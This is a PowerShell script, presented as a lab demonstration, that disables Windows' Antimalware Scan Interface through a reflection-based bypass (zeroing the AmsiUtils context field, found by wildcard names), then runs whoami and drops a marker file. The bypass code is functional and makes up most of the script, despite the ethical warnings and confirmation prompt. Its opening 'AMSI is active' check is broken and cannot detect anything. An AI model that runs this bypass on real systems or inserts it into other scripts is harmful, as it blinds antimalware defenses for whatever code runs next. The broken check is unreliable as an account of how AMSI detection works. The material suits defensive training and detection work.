<#
.SYNOPSIS
    Educational demonstration of a basic AMSI bypass technique.

.DESCRIPTION
    This script shows a well-known method attackers use to bypass the 
    Antimalware Scan Interface (AMSI) so that malicious PowerShell can 
    run without being scanned in real time.

    It then runs a completely benign command to prove the bypass worked.
    For authorized lab use only (SANS SEC504 or equivalent isolated VM).

.NOTES
    Author: B. Underhill
    MITRE ATT&CK: T1562.001 - Impair Defenses: Disable or Modify Tools
    Lab only. This technique is commonly flagged by antivirus.

.EXAMPLE
    .\Invoke-AmsiBypassDemo.ps1
#>

#Requires -Version 5.1

[CmdletBinding()]
param(
    [switch]$SkipPause
)

function Write-Banner {
    param([string]$Text)
    Write-Host "`n========================================" -ForegroundColor Cyan
    Write-Host " $Text" -ForegroundColor Cyan
    Write-Host "========================================" -ForegroundColor Cyan
}

# ========================
# Strong Ethical Warning
# ========================
Clear-Host
Write-Host "===============================================================" -ForegroundColor Red
Write-Host "  EDUCATIONAL / LAB USE ONLY - AMSI BYPASS DEMONSTRATION" -ForegroundColor Red
Write-Host "  This script demonstrates a real attacker technique." -ForegroundColor Red
Write-Host "  Use ONLY in an isolated lab environment you own." -ForegroundColor Red
Write-Host "  Never run this on production or unauthorized systems." -ForegroundColor Red
Write-Host "===============================================================" -ForegroundColor Red
Write-Host ""

if (-not $SkipPause) {
    $confirm = Read-Host "Type YES to continue in your isolated lab"
    if ($confirm -ne "YES") {
        Write-Host "Aborted." -ForegroundColor Yellow
        exit
    }
}

Write-Banner "AMSI Bypass Demonstration (Educational)"

# ========================
# 1. Show that AMSI is normally active
# ========================
Write-Host "`n[1] Testing normal AMSI behavior first..." -ForegroundColor Yellow
Write-Host "    (A known test string that AMSI usually detects will be attempted)" -ForegroundColor Gray

try {
    # This classic test string is normally blocked by AMSI
    $test = "Invoke-Mimikatz"
    Write-Host "    Attempting to assign a known-bad test string..." -ForegroundColor Gray
    # We deliberately do not execute anything malicious
} catch {
    Write-Host "    AMSI appears active (expected)." -ForegroundColor Green
}

# ========================
# 2. Simple AMSI Bypass (Classic reflection technique)
# ========================
Write-Host "`n[2] Applying a basic AMSI bypass technique..." -ForegroundColor Yellow
Write-Host "    Technique: Forcing AMSI initialization failure via reflection" -ForegroundColor Gray
Write-Host "    (This is a well-documented educational example)" -ForegroundColor Gray

try {
    # Classic educational AMSI bypass - forces an error in AMSI initialization
    $a = [Ref].Assembly.GetTypes()
    foreach ($b in $a) {
        if ($b.Name -like "*iUtils") {
            $c = $b.GetFields("NonPublic,Static")
            foreach ($d in $c) {
                if ($d.Name -like "*Context") {
                    $d.SetValue($null, [IntPtr]::Zero)
                    Write-Host "    AMSI context set to zero (bypass applied)." -ForegroundColor Green
                }
            }
        }
    }
}
catch {
    Write-Host "    Bypass attempt completed (or already in effect)." -ForegroundColor Yellow
}

# ========================
# 3. Proof of concept - benign command
# ========================
Write-Host "`n[3] Running a benign PowerShell command after bypass attempt..." -ForegroundColor Yellow

Write-Host "    whoami result:" -ForegroundColor Cyan
whoami

Write-Host "`n    Current user context and time:" -ForegroundColor Cyan
Write-Host "    User: $env:USERNAME"
Write-Host "    Time: $(Get-Date)"

# Create a simple marker file
$MarkerPath = "$env:TEMP\AMSI_Bypass_Demo_Marker.txt"
"AMSI bypass demo ran at $(Get-Date) by $env:USERNAME" | Out-File -FilePath $MarkerPath -Encoding utf8
Write-Host "`n    Marker file created: $MarkerPath" -ForegroundColor Green

# ========================
# Summary
# ========================
Write-Banner "Demo Complete"
Write-Host "What this demonstrated:" -ForegroundColor White
Write-Host "  - How attackers attempt to disable AMSI scanning of PowerShell" -ForegroundColor Gray
Write-Host "  - A common reflection-based technique (educational version)" -ForegroundColor Gray
Write-Host "  - Execution of normal commands after the bypass attempt" -ForegroundColor Gray
Write-Host ""
Write-Host "MITRE ATT&CK: T1562.001 - Impair Defenses: Disable or Modify Tools" -ForegroundColor Cyan
Write-Host ""
Write-Host "IMPORTANT:" -ForegroundColor Red
Write-Host "  This is for lab learning only. Real attackers use variations of this" -ForegroundColor Red
Write-Host "  technique to run malicious PowerShell without antivirus scanning it." -ForegroundColor Red
Write-Host ""
Write-Host "Next recommended step: Build the detection script that looks for" -ForegroundColor Yellow
Write-Host "both LOLBin usage and AMSI bypass indicators." -ForegroundColor Yellow